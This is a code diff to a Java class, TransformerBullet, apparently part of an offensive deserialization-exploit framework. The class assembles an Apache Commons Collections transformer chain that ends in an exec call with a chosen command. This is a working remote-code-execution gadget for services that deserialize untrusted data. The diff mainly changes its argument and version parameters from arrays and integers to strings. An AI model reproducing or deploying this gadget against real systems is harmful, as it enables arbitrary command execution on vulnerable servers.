@@ -14,13 +14,13 @@ import java.util.LinkedList;
  * @since 2020/2/16
  */
 @SuppressWarnings ( "rawtypes" )
-@Dependencies({"*"})
+@Dependencies({"set --args command --args version"})
 @Authors({ Authors.WH1T3P1G })
 public class TransformerBullet implements ObjectGadget<Object> {
 
-    String[] args;
+    String args;
 
-    int version = 3;// 默认生成commonscollections 3.2.1
+    String version = "3";// 默认生成commonscollections 3.2.1
 
     Class transformerClazz;
 
@@ -28,10 +28,9 @@ public class TransformerBullet implements ObjectGadget<Object> {
 
     Class invokerTransformerClazz;
 
-
-    public TransformerBullet(String[] args, int version) {
+    public TransformerBullet(String args, String version) {
         this.args = args == null? PayloadHelper.defaultTestCommand() : args;
-        this.version = version!=3 ? 4 : 3;
+        this.version = version.equals("3") ? "3" : "4";
         try {
             initClazz();
         } catch (ClassNotFoundException e) {
@@ -48,19 +47,19 @@ public class TransformerBullet implements ObjectGadget<Object> {
         transformers.add(createInvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {
                 null, new Object[0] }));
         transformers.add(createInvokerTransformer(
-                "exec", new Class[] { String.class }, args));
+                "exec", new Class[] { String.class }, new String[]{args}));
         transformers.add(createConstantTransformer(1));
 
         return createTransformerArray(transformers);
     }
 
-    public void setVersion(int version) {
+    public void setVersion(String version) {
         this.version = version;
     }
 
     public void initClazz() throws ClassNotFoundException {
         try{
-            if(version == 3){
+            if(version.equals("3")){
                 transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
                 constantTransformerClazz = Class.forName("org.apache.commons.collections.functors.ConstantTransformer");
                 invokerTransformerClazz = Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
@@ -95,7 +94,7 @@ public class TransformerBullet implements ObjectGadget<Object> {
 
 
     public static void main(String[] args) {
-        ObjectGadget bullet = new TransformerBullet(new String[]{"ls -al"},4);
+        ObjectGadget bullet = new TransformerBullet(null,"4");
         try {
             Object obj = bullet.getObject();
             System.out.println(obj);
